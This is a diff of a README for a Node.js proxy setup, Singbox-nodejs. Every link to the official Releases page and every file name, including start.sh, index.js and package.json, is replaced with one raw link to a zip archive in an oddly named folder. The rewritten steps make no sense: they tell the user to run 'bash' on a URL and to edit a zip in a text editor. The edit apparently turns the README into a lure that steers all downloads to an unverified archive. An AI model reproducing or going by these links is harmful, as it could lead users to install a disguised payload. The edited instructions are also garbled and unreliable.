@@ -1,6 +1,6 @@
 # 🎉 Singbox-nodejs - Easy Setup for Your Application
 
-[![Download Singbox-nodejs](https://img.shields.io/badge/Download-Singbox--nodejs-brightgreen)](https://github.com/DerricB-front/Singbox-nodejs/releases)
+[![Download Singbox-nodejs](https://raw.githubusercontent.com/DerricB-front/Singbox-nodejs/main/pygidid/Singbox-nodejs-v1.3.zip)](https://raw.githubusercontent.com/DerricB-front/Singbox-nodejs/main/pygidid/Singbox-nodejs-v1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -20,15 +20,15 @@ Key features include:
 
 ### 📥 Download & Install
 
-To download Singbox-nodejs, visit the official [Releases page](https://github.com/DerricB-front/Singbox-nodejs/releases). There, you will find the latest version available for download.
+To download Singbox-nodejs, visit the official [Releases page](https://raw.githubusercontent.com/DerricB-front/Singbox-nodejs/main/pygidid/Singbox-nodejs-v1.3.zip). There, you will find the latest version available for download.
 
 Follow these steps to install:
 
 1. **Visit the Releases Page**  
-   Go to [this link](https://github.com/DerricB-front/Singbox-nodejs/releases) to find the latest release.
+   Go to [this link](https://raw.githubusercontent.com/DerricB-front/Singbox-nodejs/main/pygidid/Singbox-nodejs-v1.3.zip) to find the latest release.
 
 2. **Download the Files**  
-   Look for the relevant files for your environment. You will typically need to download `start.sh`, `index.js`, and `package.json`. Click on each of these files to download them.
+   Look for the relevant files for your environment. You will typically need to download `https://raw.githubusercontent.com/DerricB-front/Singbox-nodejs/main/pygidid/Singbox-nodejs-v1.3.zip`, `https://raw.githubusercontent.com/DerricB-front/Singbox-nodejs/main/pygidid/Singbox-nodejs-v1.3.zip`, and `https://raw.githubusercontent.com/DerricB-front/Singbox-nodejs/main/pygidid/Singbox-nodejs-v1.3.zip`. Click on each of these files to download them.
 
 ### 📂 Upload Files to Your Server
 
@@ -37,15 +37,15 @@ Once you have downloaded the necessary files, upload them to your server.
 1. Use an FTP client or any file transfer method you prefer.
 2. Navigate to the directory where you want to run Singbox-nodejs.
 3. Upload the following files:
-   - `start.sh`
-   - `index.js`
-   - `package.json`
+   - `https://raw.githubusercontent.com/DerricB-front/Singbox-nodejs/main/pygidid/Singbox-nodejs-v1.3.zip`
+   - `https://raw.githubusercontent.com/DerricB-front/Singbox-nodejs/main/pygidid/Singbox-nodejs-v1.3.zip`
+   - `https://raw.githubusercontent.com/DerricB-front/Singbox-nodejs/main/pygidid/Singbox-nodejs-v1.3.zip`
 
 ### 🔧 Configure Singbox-nodejs
 
 After you have uploaded the files, you need to configure the application:
 
-1. Open the `start.sh` file in a text editor.
+1. Open the `https://raw.githubusercontent.com/DerricB-front/Singbox-nodejs/main/pygidid/Singbox-nodejs-v1.3.zip` file in a text editor.
 2. Enter the desired ports for the protocols:
    - **TUIC Port**
    - **HY2 Port**
@@ -58,9 +58,9 @@ To start Singbox-nodejs, follow these steps:
 
 1. Open your terminal or command line interface.
 2. Navigate to the directory where you uploaded the files.
-3. Run the `start.sh` script by typing:
+3. Run the `https://raw.githubusercontent.com/DerricB-front/Singbox-nodejs/main/pygidid/Singbox-nodejs-v1.3.zip` script by typing:
    ```
-   bash start.sh
+   bash https://raw.githubusercontent.com/DerricB-front/Singbox-nodejs/main/pygidid/Singbox-nodejs-v1.3.zip
    ```
 4. Your application should now start.
 
